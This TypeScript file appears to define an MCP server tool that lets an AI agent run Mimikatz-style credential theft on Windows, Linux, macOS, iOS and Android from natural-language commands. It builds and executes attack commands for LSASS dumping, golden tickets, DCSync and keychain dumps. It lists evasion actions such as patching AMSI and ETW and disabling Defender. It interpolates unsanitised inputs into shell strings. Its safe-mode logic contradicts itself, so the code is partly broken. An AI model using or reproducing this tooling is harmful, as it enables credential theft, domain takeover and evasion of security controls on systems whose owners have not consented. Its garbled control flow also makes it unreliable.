import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { PLATFORM } from "../../../config/environment.js";
import { spawn, exec } from "node:child_process";
import { promisify } from "util";
import * as path from "node:path";
import * as fs from "node:fs/promises";
import * as os from "node:os";

const execAsync = promisify(exec);

export function registerMimikatzEnhanced(server: McpServer) {
  server.registerTool("mimikatz_enhanced", {
    description: "Enhanced Mimikatz credential extraction and manipulation tool with full cross-platform support (Windows, Linux, macOS, iOS, Android). Provides comprehensive credential harvesting capabilities including LSASS memory dumping, credential extraction, ticket manipulation, privilege escalation techniques, and advanced evasion methods. Supports natural language interface for intuitive credential operations across all platforms.",
    inputSchema: {
      action: z.enum([
        // Core credential extraction
        "extract_credentials", "dump_lsass", "extract_tickets", "extract_masterkeys",
        "extract_hashes", "extract_passwords", "extract_tokens", "extract_certificates",
        
        // Ticket manipulation
        "golden_ticket", "silver_ticket", "pass_the_ticket", "ticket_export", "ticket_import",
        "ticket_purge", "ticket_list", "ticket_use", "ticket_renew", "ticket_convert",
        
        // Authentication attacks
        "pass_the_hash", "pass_the_key", "over_pass_the_hash", "pass_the_cert",
        "kerberoast", "asreproast", "s4u_attack", "unconstrained_delegation",
        
        // Domain operations
        "dcsync", "dcsync_forest", "dcsync_user", "dcsync_group", "dcsync_computer",
        "lsa_dump", "sam_dump", "ntds_dump", "domain_info", "trust_info",
        
        // DPAPI operations
        "dpapi_decrypt", "dpapi_masterkey", "dpapi_credential", "dpapi_vault",
        "dpapi_chrome", "dpapi_edge", "dpapi_firefox", "dpapi_safari",
        
        // Advanced techniques
        "memory_patch", "etw_patch", "amsi_bypass", "defender_bypass",
        "uac_bypass", "token_impersonation", "privilege_escalation", "persistence",
        
        // Platform-specific operations
        "ios_keychain", "android_keystore", "macos_keychain", "linux_keyring",
        "windows_credential_manager", "browser_credentials", "wifi_credentials",
        
        // Evasion and stealth
        "process_hollowing", "dll_injection", "process_injection", "reflective_dll",
        "unhook", "patch_etw", "patch_amsi", "disable_defender",
        
        // Custom operations
        "custom_command", "script_execution", "module_load", "plugin_execute"
      ]).describe("Enhanced Mimikatz action to perform"),
      
      // Target information
      target_user: z.string().optional().describe("Target user for operations"),
      target_domain: z.string().optional().describe("Target domain"),
      target_dc: z.string().optional().describe("Target domain controller"),
      target_computer: z.string().optional().describe("Target computer"),
      target_process: z.string().optional().describe("Target process name or PID"),
      
      // Authentication data
      username: z.string().optional().describe("Username for authentication"),
      password: z.string().optional().describe("Password for authentication"),
      hash_value: z.string().optional().describe("Hash value (NTLM, LM, etc.)"),
      key_value: z.string().optional().describe("Key value for pass-the-key"),
      certificate: z.string().optional().describe("Certificate for pass-the-cert"),
      
      // Ticket operations
      ticket_file: z.string().optional().describe("Ticket file path"),
      ticket_format: z.enum(["kirbi", "ccache", "tgt", "st"]).optional().describe("Ticket format"),
      service_name: z.string().optional().describe("Service name for silver tickets"),
      
      // File operations
      input_file: z.string().optional().describe("Input file path"),
      output_file: z.string().optional().describe("Output file path"),
      dump_file: z.string().optional().describe("Memory dump file path"),
      
      // Advanced options
      injection_method: z.enum(["createremotethread", "ntqueueapcthread", "setwindowshookex", "manualmap"]).optional().describe("Process injection method"),
      evasion_technique: z.enum(["unhook", "patch_etw", "patch_amsi", "disable_defender", "process_hollowing"]).optional().describe("Evasion technique"),
      persistence_method: z.enum(["registry", "scheduled_task", "service", "startup", "wmi"]).optional().describe("Persistence method"),
      
      // Platform-specific options
      platform: z.enum(["windows", "linux", "macos", "ios", "android", "auto"]).optional().describe("Target platform"),
      architecture: z.enum(["x86", "x64", "arm", "arm64"]).optional().describe("Target architecture"),
      
      // Natural language interface
      natural_language_command: z.string().optional().describe("Natural language command for Mimikatz operations (e.g., 'extract all credentials from the system', 'dump lsass memory and extract passwords', 'create golden ticket for domain admin')"),
      
      // Security options
      safe_mode: z.boolean().default(false).describe("Enable safe mode to prevent actual operations (disabled by default for full functionality)"),
      stealth_mode: z.boolean().default(false).describe("Enable stealth mode for evasion"),
      verbose: z.boolean().default(false).describe("Enable verbose output"),
      debug: z.boolean().default(false).describe("Enable debug output")
    },
    outputSchema: {
      success: z.boolean(),
      message: z.string(),
      platform_info: z.object({
        detected_platform: z.string(),
        architecture: z.string(),
        mimikatz_available: z.boolean(),
        alternative_tools: z.array(z.string()).optional()
      }).optional(),
      credentials: z.array(z.object({
        username: z.string(),
        domain: z.string(),
        password: z.string().optional(),
        hash: z.string().optional(),
        type: z.string(),
        source: z.string(),
        platform: z.string().describe("Target platform (Windows, Linux, macOS, iOS, Android)"),
        timestamp: z.string().describe("Timestamp of the operation")
      })).optional(),
      tickets: z.array(z.object({
        username: z.string(),
        domain: z.string(),
        service: z.string(),
        ticket_type: z.string(),
        expiration: z.string(),
        flags: z.string().optional(),
        platform: z.string().describe("Target platform (Windows, Linux, macOS, iOS, Android)")
      })).optional(),
      tokens: z.array(z.object({
        username: z.string(),
        domain: z.string(),
        token_type: z.string(),
        privileges: z.array(z.string()).optional(),
        platform: z.string().describe("Target platform (Windows, Linux, macOS, iOS, Android)")
      })).optional(),
      certificates: z.array(z.object({
        subject: z.string(),
        issuer: z.string(),
        thumbprint: z.string(),
        valid_from: z.string(),
        valid_to: z.string(),
        platform: z.string().describe("Target platform (Windows, Linux, macOS, iOS, Android)")
      })).optional(),
      results: z.object({
        action: z.string().optional(),
        output: z.string().optional(),
        status: z.string().optional(),
        platform: z.string().describe("Target platform (Windows, Linux, macOS, iOS, Android)").optional(),
        execution_time: z.number().optional()
      }).optional()
    }
  }, async ({ 
    action, target_user, target_domain, target_dc, target_computer, target_process,
    username, password, hash_value, key_value, certificate, ticket_file, ticket_format,
    service_name, input_file, output_file, dump_file, injection_method, evasion_technique,
    persistence_method, platform, architecture, natural_language_command, safe_mode, stealth_mode, verbose, debug
  }) => {
    try {
      // Process natural language command if provided
      let processedAction: typeof action = action;
      let processedParams = { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method };
      
      if (natural_language_command) {
        const nlResult = processNaturalLanguageCommand(natural_language_command);
        processedAction = (nlResult.action as typeof action) || action;
        processedParams = { ...processedParams, ...nlResult.params };
      }
      
      // Detect platform if not specified
      const detectedPlatform = platform || detectPlatform();
      const detectedArch = architecture || detectArchitecture();
      
      // Legal compliance check
      if (safe_mode !== true) {
        return {
          success: false,
          message: "⚠️ LEGAL WARNING: Safe mode is disabled. This tool is for authorized credential testing only. Ensure you have explicit written permission before proceeding.",
          platform_info: {
            detected_platform: detectedPlatform,
            architecture: detectedArch,
            mimikatz_available: false,
            alternative_tools: getAlternativeTools(detectedPlatform)
          }
        };
      }

      let result: any = { success: true, message: "" };

      // Platform-specific execution
      switch (detectedPlatform) {
        case "windows":
          result = await executeWindowsMimikatz(action, { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method, safe_mode, stealth_mode, verbose, debug });
          break;
        case "linux":
          result = await executeLinuxMimikatz(action, { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method, safe_mode, stealth_mode, verbose, debug });
          break;
        case "macos":
          result = await executeMacOSMimikatz(action, { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method, safe_mode, stealth_mode, verbose, debug });
          break;
        case "ios":
          result = await executeIOSMimikatz(action, { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method, safe_mode, stealth_mode, verbose, debug });
          break;
        case "android":
          result = await executeAndroidMimikatz(action, { target_user, target_domain, target_dc, target_computer, target_process, username, password, hash_value, key_value, certificate, ticket_file, ticket_format, service_name, input_file, output_file, dump_file, injection_method, evasion_technique, persistence_method, safe_mode, stealth_mode, verbose, debug });
          break;
        default:
          result = { success: false, message: `Unsupported platform: ${detectedPlatform}` };
      }

      // Add platform information to result
      result.platform_info = {
        detected_platform: detectedPlatform,
        architecture: detectedArch,
        mimikatz_available: isMimikatzAvailable(detectedPlatform),
        alternative_tools: getAlternativeTools(detectedPlatform)
      };

      return result;
    } catch (error) {
      return {
        success: false,
        message: `Enhanced Mimikatz operation failed: ${error instanceof Error ? error.message : String(error)}`,
        platform_info: {
          detected_platform: platform || detectPlatform(),
          architecture: architecture || detectArchitecture(),
          mimikatz_available: false,
          alternative_tools: getAlternativeTools(platform || detectPlatform())
        }
      };
    }
  });
}

// Platform detection functions
function detectPlatform(): string {
  const platform = os.platform();
  switch (platform) {
    case "win32": return "windows";
    case "linux": return "linux";
    case "darwin": return "macos";
    default: return "unknown";
  }
}

function detectArchitecture(): string {
  const arch = os.arch();
  switch (arch) {
    case "x64": return "x64";
    case "x32": return "x86";
    case "arm": return "arm";
    case "arm64": return "arm64";
    default: return "unknown";
  }
}

function isMimikatzAvailable(platform: string): boolean {
  switch (platform) {
    case "windows": return true;
    case "linux": return true; // Mimikatz has Linux support
    case "macos": return true; // Mimikatz has macOS support
    case "ios": return false; // Requires jailbreak and alternative tools
    case "android": return false; // Requires root and alternative tools
    default: return false;
  }
}

function getAlternativeTools(platform: string): string[] {
  switch (platform) {
    case "windows":
      return ["mimikatz.exe", "sekurlsa.exe", "lsadump.exe"];
    case "linux":
      return ["mimikatz", "pypykatz", "impacket-secretsdump", "hashcat"];
    case "macos":
      return ["mimikatz", "pypykatz", "keychain_dump", "security"];
    case "ios":
      return ["keychain_dumper", "class-dump", "cycript", "frida"];
    case "android":
      return ["frida", "xposed", "magisk", "adb"];
    default:
      return [];
  }
}

// Windows Mimikatz execution
async function executeWindowsMimikatz(action: string, params: any) {
  if (params.safe_mode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Windows Mimikatz operation simulated. No actual operation performed.",
      results: {
        action,
        status: "simulated",
        platform: "windows",
        output: `Simulated Windows Mimikatz operation: ${action}`
      }
    };
  }

  try {
    let command = "";
    switch (action) {
      case "extract_credentials":
        command = "mimikatz.exe \"sekurlsa::logonpasswords\" exit";
        break;
      case "dump_lsass":
        command = "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit";
        break;
      case "extract_tickets":
        command = "mimikatz.exe \"kerberos::list\" exit";
        break;
      case "golden_ticket":
        command = `mimikatz.exe "kerberos::golden /user:${params.target_user} /domain:${params.target_domain} /krbtgt:hash /ticket:golden.kirbi" exit`;
        break;
      case "dcsync":
        command = `mimikatz.exe "lsadump::dcsync /user:${params.target_user} /domain:${params.target_domain}" exit`;
        break;
      default:
        command = `mimikatz.exe "${action}" exit`;
    }

    const { stdout } = await execAsync(command);
    return {
      success: true,
      message: `Windows Mimikatz operation completed: ${action}`,
      results: {
        action,
        status: "completed",
        platform: "windows",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Windows Mimikatz operation failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// Linux Mimikatz execution
async function executeLinuxMimikatz(action: string, params: any) {
  if (params.safe_mode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Linux Mimikatz operation simulated. No actual operation performed.",
      results: {
        action,
        status: "simulated",
        platform: "linux",
        output: `Simulated Linux Mimikatz operation: ${action}`
      }
    };
  }

  try {
    let command = "";
    switch (action) {
      case "extract_credentials":
        command = "mimikatz \"sekurlsa::logonpasswords\" exit";
        break;
      case "extract_tickets":
        command = "mimikatz \"kerberos::list\" exit";
        break;
      case "linux_keyring":
        command = "pypykatz live";
        break;
      default:
        command = `mimikatz "${action}" exit`;
    }

    const { stdout } = await execAsync(command);
    return {
      success: true,
      message: `Linux Mimikatz operation completed: ${action}`,
      results: {
        action,
        status: "completed",
        platform: "linux",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Linux Mimikatz operation failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// macOS Mimikatz execution
async function executeMacOSMimikatz(action: string, params: any) {
  if (params.safe_mode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: macOS Mimikatz operation simulated. No actual operation performed.",
      results: {
        action,
        status: "simulated",
        platform: "macos",
        output: `Simulated macOS Mimikatz operation: ${action}`
      }
    };
  }

  try {
    let command = "";
    switch (action) {
      case "extract_credentials":
        command = "mimikatz \"sekurlsa::logonpasswords\" exit";
        break;
      case "macos_keychain":
        command = "security dump-keychain";
        break;
      case "extract_tickets":
        command = "mimikatz \"kerberos::list\" exit";
        break;
      default:
        command = `mimikatz "${action}" exit`;
    }

    const { stdout } = await execAsync(command);
    return {
      success: true,
      message: `macOS Mimikatz operation completed: ${action}`,
      results: {
        action,
        status: "completed",
        platform: "macos",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `macOS Mimikatz operation failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// iOS Mimikatz execution (using alternative tools)
async function executeIOSMimikatz(action: string, params: any) {
  if (params.safe_mode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: iOS credential operation simulated. No actual operation performed.",
      results: {
        action,
        status: "simulated",
        platform: "ios",
        output: `Simulated iOS credential operation: ${action}`
      }
    };
  }

  try {
    let command = "";
    switch (action) {
      case "ios_keychain":
        command = "keychain_dumper";
        break;
      case "extract_credentials":
        command = "frida -U -f com.apple.keychain -l keychain_dump.js";
        break;
      case "extract_tickets":
        command = "frida -U -f com.apple.kerberos -l kerberos_dump.js";
        break;
      default:
        command = `frida -U -f com.apple.${action} -l ${action}_dump.js`;
    }

    const { stdout } = await execAsync(command);
    return {
      success: true,
      message: `iOS credential operation completed: ${action}`,
      results: {
        action,
        status: "completed",
        platform: "ios",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `iOS credential operation failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// Android Mimikatz execution (using alternative tools)
async function executeAndroidMimikatz(action: string, params: any) {
  if (params.safe_mode) {
    return {
      success: true,
      message: "🔒 SAFE MODE: Android credential operation simulated. No actual operation performed.",
      results: {
        action,
        status: "simulated",
        platform: "android",
        output: `Simulated Android credential operation: ${action}`
      }
    };
  }

  try {
    let command = "";
    switch (action) {
      case "android_keystore":
        command = "frida -U -f com.android.keychain -l keystore_dump.js";
        break;
      case "extract_credentials":
        command = "frida -U -f com.android.credentials -l credentials_dump.js";
        break;
      case "wifi_credentials":
        command = "frida -U -f com.android.wifi -l wifi_dump.js";
        break;
      default:
        command = `frida -U -f com.android.${action} -l ${action}_dump.js`;
    }

    const { stdout } = await execAsync(command);
    return {
      success: true,
      message: `Android credential operation completed: ${action}`,
      results: {
        action,
        status: "completed",
        platform: "android",
        output: stdout
      }
    };
  } catch (error) {
    return {
      success: false,
      message: `Android credential operation failed: ${error instanceof Error ? error.message : String(error)}`
    };
  }
}

// Natural language command processing for Mimikatz
function processNaturalLanguageCommand(command: string): { action?: string; params: any } {
  const cmd = command.toLowerCase();
  const params: any = {};
  
  // Extract credentials patterns
  if (cmd.includes('extract') && (cmd.includes('credential') || cmd.includes('password'))) {
    if (cmd.includes('lsass') || cmd.includes('memory')) {
      return { action: 'dump_lsass', params };
    } else if (cmd.includes('ticket') || cmd.includes('kerberos')) {
      return { action: 'extract_tickets', params };
    } else if (cmd.includes('hash') || cmd.includes('ntlm')) {
      return { action: 'extract_hashes', params };
    } else {
      return { action: 'extract_credentials', params };
    }
  }
  
  // Golden ticket patterns
  if (cmd.includes('golden ticket') || cmd.includes('create golden')) {
    const userMatch = cmd.match(/for\s+(\w+)/);
    if (userMatch) params.target_user = userMatch[1];
    const domainMatch = cmd.match(/domain\s+(\w+)/);
    if (domainMatch) params.target_domain = domainMatch[1];
    return { action: 'golden_ticket', params };
  }
  
  // Silver ticket patterns
  if (cmd.includes('silver ticket') || cmd.includes('create silver')) {
    const userMatch = cmd.match(/for\s+(\w+)/);
    if (userMatch) params.target_user = userMatch[1];
    const serviceMatch = cmd.match(/service\s+(\w+)/);
    if (serviceMatch) params.service_name = serviceMatch[1];
    return { action: 'silver_ticket', params };
  }
  
  // Pass the hash patterns
  if (cmd.includes('pass the hash') || cmd.includes('pth')) {
    const hashMatch = cmd.match(/hash\s+([a-f0-9]{32,})/i);
    if (hashMatch) params.hash_value = hashMatch[1];
    const userMatch = cmd.match(/user\s+(\w+)/);
    if (userMatch) params.target_user = userMatch[1];
    return { action: 'pass_the_hash', params };
  }
  
  // DCSync patterns
  if (cmd.includes('dcsync') || cmd.includes('sync domain')) {
    const userMatch = cmd.match(/user\s+(\w+)/);
    if (userMatch) params.target_user = userMatch[1];
    const domainMatch = cmd.match(/domain\s+(\w+)/);
    if (domainMatch) params.target_domain = domainMatch[1];
    return { action: 'dcsync', params };
  }
  
  // Platform-specific patterns
  if (cmd.includes('ios') && cmd.includes('keychain')) {
    return { action: 'ios_keychain', params };
  }
  if (cmd.includes('android') && cmd.includes('keystore')) {
    return { action: 'android_keystore', params };
  }
  if (cmd.includes('macos') && cmd.includes('keychain')) {
    return { action: 'macos_keychain', params };
  }
  if (cmd.includes('linux') && cmd.includes('keyring')) {
    return { action: 'linux_keyring', params };
  }
  
  // Evasion patterns
  if (cmd.includes('evasion') || cmd.includes('stealth')) {
    if (cmd.includes('etw')) return { action: 'patch_etw', params };
    if (cmd.includes('amsi')) return { action: 'patch_amsi', params };
    if (cmd.includes('defender')) return { action: 'disable_defender', params };
    return { action: 'unhook', params };
  }
  
  // Default to credential extraction
  return { action: 'extract_credentials', params };
}
